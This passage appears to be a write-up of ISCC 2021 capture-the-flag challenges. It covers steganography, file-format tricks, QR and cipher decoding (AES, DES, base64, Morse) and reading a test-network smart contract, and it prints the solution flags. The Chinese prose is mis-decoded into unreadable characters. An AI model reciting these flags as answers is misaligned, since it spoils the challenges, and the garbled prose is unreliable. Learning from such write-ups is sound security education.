class="hljs-number">12</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11.75</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11.5</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11.25</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11</span>, <span class="hljs-number">1.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11</span>, <span class="hljs-number">1.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11</span>, <span class="hljs-number">2.5</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11</span>, <span class="hljs-number">2.75</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11.25</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11.5</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>], [<span class="hljs-number">11.75</span>, <span class="hljs-number">2.25</span>, <span class="hljs-number">1</span>]]  <span class="hljs-comment"># å¾—åˆ°äº”ä¸ªç‚¹</span><br>plt.figure()  <span class="hljs-comment"># å¾—åˆ°ç”»é¢</span><br>ax1 = plt.axes(projection=<span class="hljs-string">&#x27;3d&#x27;</span>)<br>ax1.set_xlim(<span class="hljs-number">0</span>, <span class="hljs-number">15</span>)  <span class="hljs-comment"># Xè½´ï¼Œæ¨ªå‘å‘å³æ–¹å‘</span><br>ax1.set_ylim(<span class="hljs-number">15</span>, <span class="hljs-number">0</span>)  <span class="hljs-comment"># Yè½´,å·¦å‘ä¸X,Zè½´äº’ä¸ºå‚ç›´</span><br>ax1.set_zlim(<span class="hljs-number">0</span>, <span class="hljs-number">15</span>)  <span class="hljs-comment"># ç«–å‘ä¸ºZè½´</span><br>color1 = [<span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;k&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>]<br>marker1 = [<span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;v&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;H&#x27;</span>]<br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> dot1:<br>    ax1.scatter(x[<span class="hljs-number">0</span>], x[<span class="hljs-number">1</span>], x[<span class="hljs-number">2</span>], c=color1[<span class="hljs-number">1</span>],<br>                marker=marker1[<span class="hljs-number">1</span>], linewidths=<span class="hljs-number">4</span>)  <span class="hljs-comment"># ç”¨æ•£ç‚¹å‡½æ•°ç”»ç‚¹</span><br>    i += <span class="hljs-number">1</span><br>plt.show()<br><br></code></pre></td></tr></table></figure><p>è¿è¡Œå¾—åˆ°<br><img src="https://img-blog.csdnimg.cn/20210518192536935.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å¯†ç å£ä»¤æ˜¯<code>365728</code>ï¼Œè§£å‹å‹ç¼©åŒ…ï¼Œå¾—åˆ°pdfæ–‡æ¡£<br><img src="https://img-blog.csdnimg.cn/2021050114193340.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ‘©æ–¯å¯†ç è§£å¯†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">CONGRATULATIONTHEFLAGICHALLENGEISCCTWOZEROTWOONE<br></code></pre></td></tr></table></figure><p>æ ¹æ®æç¤ºæœ€ç»ˆflagä¸º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">ISCC&#123;congratulationtheflagischallengeiscctwozerotwoone&#125;<br></code></pre></td></tr></table></figure><h3 id="æµ·å¸‚èœƒæ¥¼-1"><a href="#æµ·å¸‚èœƒæ¥¼-1" class="headerlink" title="æµ·å¸‚èœƒæ¥¼-1"></a>æµ·å¸‚èœƒæ¥¼-1</h3><blockquote><p>é¢˜ç›®æè¿°ï¼š æˆ–è®¸ä½ çœ‹åˆ°çš„åªæ˜¯æµ·å¸‚èœƒæ¥¼â€¦</p></blockquote><p>ä¸‹è½½é™„ä»¶ï¼Œæ˜¯ä¸ªdocxæ–‡æ¡£ï¼Œçœ‹åˆ°äº†å‹ç¼©åŒ…æ–‡ä»¶å¤´PK<br><img src="https://img-blog.csdnimg.cn/20210501112349328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¿®æ”¹åç¼€ä¸ºzipï¼Œè§£å‹ï¼Œåœ¨document.xmlæ–‡ä»¶ä¸­æ‰¾åˆ°flag<br><img src="https://img-blog.csdnimg.cn/20210501112248789.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ–¹æ³•äºŒï¼š<br>ä½¿ç”¨winraråœ¨æ–‡ä»¶ä¸­æœç´¢ISCCå­—ç¬¦ä¸²<br><img src="https://img-blog.csdnimg.cn/20210506222625824.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="åŒºå—é“¾"><a href="#åŒºå—é“¾" class="headerlink" title="åŒºå—é“¾"></a>åŒºå—é“¾</h3><p>å‚è€ƒï¼š<a href="https://terminalcats.com/0x41414141-ctf-blockchain-sanity-check-400/">https://terminalcats.com/0x41414141-ctf-blockchain-sanity-check-400/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">pragma solidity ^0.7.0;  // æŒ‡å®šæ‰€éœ€çš„ç¼–è¯‘å™¨ç‰ˆæœ¬<br>//SPDX-License-Identifier: UNLICENSED<br><br>contract look_look &#123;<br>    <span class="hljs-keyword">function</span> sloc111() public pure returns (string memory)&#123;    //publicæ™ºèƒ½åˆçº¦å¤–éƒ¨å’Œå†…éƒ¨éƒ½å¯ä½¿ç”¨çš„æ–¹æ³•<br>        <span class="hljs-built_in">return</span> <span class="hljs-string">&quot;flag&#123;&#125;&quot;</span>;<br>    &#125;<br>&#125;<br><br><br><br>åˆçº¦åœ°å€: 0x0ed72dfd4c63dd97df8fec07e5a6bba466c6adf5<br></code></pre></td></tr></table></figure><p>éœ€è¦æŒ‚ä»£ç†ï¼Œè®¿é—®<a href="https://rinkeby.etherscan.io/">https://rinkeby.etherscan.io/</a></p><p>ç¬¬ä¸€æ¬¡åšæ™ºèƒ½åˆçº¦æ–¹é¢çš„é¢˜ï¼Œè¾“å…¥åˆçº¦åœ°å€ï¼Œç„¶åç‚¹å‡»Contract<br><img src="https://img-blog.csdnimg.cn/2021050620485295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç‚¹å‡»Decompile ByteCodeï¼Œåˆ°è¿™å°±å¡ä½äº†<br><img src="https://img-blog.csdnimg.cn/20210506205053606.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ˜ŸæœŸå¤©æ‰“äº†ä¸ªæ¯”èµ›ï¼Œé‡Œé¢ä¹Ÿæœ‰ä¸ªåŒºå—é“¾é¢˜-<a href="https://www.anquanke.com/post/id/242237#h3-4">AZ</a>ã€‚å…¬é“¾æ˜æ–‡æ³„éœ²<br><img src="https://img-blog.csdnimg.cn/20210526141613891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é€‰æ‹©UTF-8 æŸ¥çœ‹,å¾—åˆ°flag<br><img src="https://img-blog.csdnimg.cn/20210526141638578.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="ç¾äººè®¡"><a href="#ç¾äººè®¡" class="headerlink" title="ç¾äººè®¡"></a>ç¾äººè®¡</h3><blockquote><p>é¢˜ç›®æè¿°ï¼šç¾äººè¯´çš„è¯é‡Œæœ‰è§£é¢˜æç¤ºï¼Œä½†æ˜¯ç¾äººçš„è¯ä¸èƒ½å…¨ä¿¡ã€‚</p></blockquote><p>æˆ‘è®°å¾—å½“æ—¶é™„ä»¶æ–‡æ¡£ä¸­æœ‰ä¸¤ä¸ªäºŒç»´ç ï¼ŒäºŒç»´ç å†…å®¹è¿˜ä¿å­˜ç€ï¼Œå›¾ç‰‡ä¸è§äº†ï¼Œä¸çŸ¥é“æ€ä¹ˆå›äº‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">ç¬¬ä¸€ä¸ªäºŒç»´ç ï¼š<br>U2FsdGVkX1/Ka+sScszwQkwhO+VLiJwV/<span class="hljs-number">6</span>IFg5W+TfNHGxG2qZsIr2iwMwb9X9Iu<br><span class="hljs-number">3</span>GuGWmPOtO27z8vNppD2D50fwsD+<span class="hljs-number">8</span>VWhdtW9J4cewYivH/Z/<span class="hljs-number">7</span>GoUvcJXJMrvf+vu<br>+CBqWDGp6HWd0e5whGhuzlK0ZtBcDZdPDSIHA7+GuUlifp8PcFCtJPgiuk143REE<br>+pKFiSJXolXLR1vJCdGY9w5mXFbiWPrb2U7r/v5noP8=<br><br>ç¬¬äºŒä¸ªäºŒç»´ç ï¼š<br>U2FsdGVkX19eOY/pDh8+vPAcvfkLi1XLUneVzjLLOMul53sKK8UpobdCOiPIv4KE<br></code></pre></td></tr></table></figure><p>å›¾ç‰‡å±æ€§ç»™çš„æç¤ºï¼ŒAESåŠ å¯†ï¼Œå¯†é’¥æ˜¯ISCC2021</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">Try</span> AES, <span class="hljs-keyword">and</span> you will get the flag. ISCC2021<br></code></pre></td></tr></table></figure><p>å¯¹ç¬¬ä¸€ä¸ªäºŒç»´ç å†…å®¹ï¼Œè§£äº†ä¸‰æ¬¡AESåŠ å¯†å¾—åˆ°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">y0u_h@ve_fal1en_intO_tHe_tr@p_0f_tHe_be@uty_!<br></code></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ªäºŒç»´ç å†…å®¹ï¼Œè¿›è¡ŒAESè§£å¯†å‘ç°ä¸è¡Œï¼Œç„¶åå°è¯•DESè§£å¯†ç»“æœæˆåŠŸäº†ï¼Œå¾—åˆ°flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">ISCC&#123;be@uty_1ike<span class="hljs-variable">$_Y0u_2O2lISCC</span>&#125;<br></code></pre></td></tr></table></figure><p>å†å¤ç°çš„æ—¶å€™ï¼Œé™„ä»¶ä¸­å°±å‰©ä¸€å¼ äºŒç»´ç äº†ï¼ŒæŠŠdocxåç¼€è½¬æ¢æˆzipè§£å‹ï¼Œå‡ºé¢˜äººå˜ç‹—äº†ï¼ŒæŠŠç¬¬äºŒå¼ äºŒç»´ç è—åœ¨è¿™äº†ï¼Œå’Œä¸Šé¢çš„æ–¹æ³•ä¸€æ ·ï¼Œå¾—åˆ°flag<br><img src="https://img-blog.csdnimg.cn/2021051320345497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="æˆ‘çš„æŠ˜æ‰£æ˜¯å¤šå°‘"><a href="#æˆ‘çš„æŠ˜æ‰£æ˜¯å¤šå°‘" class="headerlink" title="æˆ‘çš„æŠ˜æ‰£æ˜¯å¤šå°‘"></a>æˆ‘çš„æŠ˜æ‰£æ˜¯å¤šå°‘</h3><blockquote><p>é¢˜ç›®æè¿°ï¼š<br>å°cåŒå­¦å»å‚åŠ éŸ³ä¹ä¼šï¼Œåœ¨å®˜ç½‘ä¹°ç¥¨æ—¶å‘ç°äº†æœ‰æç¤ºæ¶ˆæ¯ï¼Œæä¾›ç»™çš„æœ‰â€œgive_me_discountâ€çš„å‹ç¼©åŒ…ï¼Œå¥½å¥‡çš„å°cä¸‹è½½ä¸‹æ¥ï¼Œä½†å´æ— ä»ä¸‹æ‰‹ï¼Œä¸ºäº†èŠ‚çœé›¶èŠ±é’±ï¼Œä½ èƒ½å¸®å¸®ä»–å—ï¼Ÿ</p></blockquote><p>å‘½ä»¤è¡Œè¿è¡Œgive.exeï¼Œå¾—åˆ°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">pass1&#123;\u006b\u0072\u0077&#125;<br></code></pre></td></tr></table></figure><p>æŠŠä¸­é—´çš„è¿›è¡Œunicodeè½¬ç å¾—åˆ°ï¼špass1{krw}</p><p>010æ‰“å¼€me.zipï¼Œåœ¨æœ«å°¾å‘ç°Baseç¼–ç <br><img src="https://img-blog.csdnimg.cn/20210501162644856.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>base64è§£ç å¾—åˆ°ï¼špass2{gcc666}</p><p>æ‰€ä»¥å‹ç¼©åŒ…å£ä»¤ä¸ºkrwgcc666ï¼Œè§£å‹å¾—åˆ°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">eW91Zm91bmRtZT8=<br></code></pre></td></tr></table></figure><p>base64è§£ç </p><p><img src="https://img-blog.csdnimg.cn/20210501163008756.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æœ€åä½¿ç”¨MP3Stego</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">decode -X -P youfoundme? discount.mp3<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210501163051980.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>base32è§£ç ï¼Œæœ€ç»ˆflagä¸º</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ISCC&#123;Yourdiscount2.15&#125;<br></code></pre></td></tr></table></figure><h3 id="æµ·å¸‚èœƒæ¥¼-2"><a href="#æµ·å¸‚èœƒæ¥¼-2" class="headerlink" title="æµ·å¸‚èœƒæ¥¼-2"></a>æµ·å¸‚èœƒæ¥¼-2</h3><p>foremoståˆ†ç¦»å›¾ç‰‡ï¼Œå¾—åˆ°åŠ å¯†çš„å‹ç¼©åŒ…</p><p>ç”±äºè¿™æ˜¯ç»„åˆé¢˜ï¼Œæ‰€ä»¥è¦åœ¨æµ·å¸‚èœƒæ¥¼-1ä¸­å»æ‰¾çº¿ç´¢ã€‚æœ€ç»ˆå‘ç°true.xmlæœ‰çŒ«è…»ï¼ŒåŸæ¥æ˜¯jpgæ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/20210526091711997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¿®æ”¹ä¸ºjpg<br><img src="https://img-blog.csdnimg.cn/20210526091822427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æµ·å¸‚èœƒæ¥¼-1çš„flagä¹Ÿæœ‰çŒ«è…»ï¼Œç»“åˆflagå’Œå›¾ç‰‡ï¼Œæœ€ç»ˆå¾—åˆ°å‹ç¼©åŒ…çš„å£ä»¤ä¸ºzhongnanshanï¼Œè§£å‹æµ·å¸‚èœƒæ¥¼-2çš„å‹ç¼©åŒ…<br><img src="https://img-blog.csdnimg.cn/20210526092109814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ‰«ç å¾—åˆ°ä¸€ä¸ªç½‘å€ï¼Œå†…å®¹ä¸º<code>ZWFzeQ==</code>ï¼Œbaseè§£ç åä¸º<code>easy</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://ctewm.com/aTvQcE/kva11w<br></code></pre></td></tr></table></figure><p>ç»§ç»­å¾€ä¸‹èµ°ï¼Œforemoståˆ†ç¦»å›¾ç‰‡å¾—åˆ°å‹ç¼©åŒ…ï¼Œå£ä»¤ä¸ºeasy</p><p><img src="https://img-blog.csdnimg.cn/20210526092546155.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="Hack-the-Victim"><a href="#Hack-the-Victim" class="headerlink" title="Hack the Victim"></a>Hack the Victim</h3><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">Victimä¸ºå«æœ‰æ¼æ´çš„æ™ºèƒ½åˆçº¦ï¼Œåœ¨ Rinkebyæµ‹è¯•ç½‘ç»œçš„åˆçº¦åœ°å€ä¸ºï¼š<br><span class="hljs-number">0x68D28fE315E6A344029D42915Fbc7af4261AB833</span><br>æ¥å£ä¸ºï¼š<br>contract Victim &#123;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params"></span>) <span class="hljs-title">public</span> <span class="hljs-title">returns</span> (<span class="hljs-params"><span class="hljs-keyword">string</span> memory </span>)</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;ISCC&#123;xxxxx&#125;&quot;</span>;<br>&#125;<br>&#125;<br>è¯·ç¼–å†™æ”»å‡»åˆçº¦ï¼Œå®ç°å¯¹ Victim çš„æ”»å‡»ï¼Œè·å– flagã€‚<br></code></pre></td></tr></table></figure><p>åˆçº¦åœ°å€</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://rinkeby.etherscan.io/address/0x68D28fE315E6A344029D42915Fbc7af4261AB833<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210506204015536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>16è¿›åˆ¶è½¬å­—ç¬¦ä¸²<br><img src="https://img-blog.csdnimg.cn/20210506204048675.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¹Ÿå¯ä»¥ç›´æ¥ç‚¹å‡»Decompile ByteCodeè¿›è¡Œåç¼–è¯‘<br><img src="https://img-blog.csdnimg.cn/20210526133856346.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="æ£€æŸ¥ä¸€ä¸‹"><a href="#æ£€æŸ¥ä¸€ä¸‹" class="headerlink" title="æ£€æŸ¥ä¸€ä¸‹"></a>æ£€æŸ¥ä¸€ä¸‹</h3><blockquote><p>é¢˜ç›®æè¿°ï¼šä½ çœŸçš„äº†è§£pngæ–‡ä»¶çš„æ ¼å¼å—ï¼Ÿ</p></blockquote><p>ç”¨pngcheckæ£€æŸ¥ä¸€ä¸‹å›¾ç‰‡ï¼Œå‘ç°æœ€åä¸€ä¸ªIDATå—å¼‚å¸¸<br><img src="https://img-blog.csdnimg.cn/20210517162639589.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>010å¤åˆ¶å‡ºæ¥<br><img src="https://img-blog.csdnimg.cn/20210517162450658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä½¿ç”¨è„šæœ¬è§£å‹zlib</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zlib<br>s = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">78 9C 5D 52 09 0E C0 20 0C FA 12 FC FF 73 CB 6A</span><br><span class="hljs-string">39 54 97 4C 7B 41 2B E4 2C 00 3C DF 7F 04 69 B3</span><br><span class="hljs-string">AC E7 CA D9 27 E4 37 1D 27 15 33 01 E3 91 75 AB</span><br><span class="hljs-string">9D F4 D7 29 F3 E2 AF 13 75 21 CC AC 69 3D BB C8</span><br><span class="hljs-string">0A 2F 8C E0 26 D0 25 F9 F4 62 A2 08 C5 0A A0 69</span><br><span class="hljs-string">90 35 0D 34 E1 39 8B 8B 2A 5D A0 CA DE B4 FE 23</span><br><span class="hljs-string">61 59 CB 60 3B EE DA 82 5E 2E 1E E2 46 15 D8 8D</span><br><span class="hljs-string">AE 46 33 54 95 23 8A AD 82 FD C0 F5 CC 86 2C 76</span><br><span class="hljs-string">69 1F 34 74 8D 5F 22 70 2B 86 8A CC FA 69 EA 6D</span><br><span class="hljs-string">A4 12 DC 99 A5 21 08 B9 27 5F F3 37 40 A4 8C AA</span><br><span class="hljs-string">E7 1A A5 BE F4 AB E2 A5 B3 68 21 23 C6 07 2E D4</span><br><span class="hljs-string">9F 5D E1 77 9E 9A</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>s = s.replace(<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>b = <span class="hljs-built_in">bytes</span>.fromhex(s)<br>flag = zlib.decompress(b)<br>print(flag)<br></code></pre></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1111111000100100110000111111110000010011011110010101000001101110100111010011010010111011011101000000111011110101110110111010010111101110001011101100000101110111000010010000011111111010101010101010111111100000000011100100110100000000100101101110000101010101000001101000011101011011011100101000001110010010001111011110010001100000101101100111111001010110101101110000100011110100110001001100010010101110000111111111110010100110101001111110010110001100110111110111000110011110010001111001110000100011010000110100100000001011001010101101110100011011010011100011101001111011111000101001101101101100101010001111101000000000011101101101010001011011111110000011110000101011010100000101011110010101000101101011101001010011001011111001010111010110101111000001101001101110100101010000010100111011000001000011101000011001001011111110100100100000111100110<br></code></pre></td></tr></table></figure><p>ç›´æ¥binwalkå›¾ç‰‡ï¼Œä¹Ÿèƒ½å¾—åˆ°åŒæ ·çš„ç»“æœ<br><img src="https://img-blog.csdnimg.cn/20210518191058101.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä¸€å…±841ä½ï¼ŒçŒœæµ‹æ˜¯29*29çš„äºŒç»´ç ï¼Œç›´æ¥ä½¿ç”¨è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>MAX = <span class="hljs-number">29</span><br>pic = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>,(MAX, MAX))<br><span class="hljs-built_in">str</span> = <span 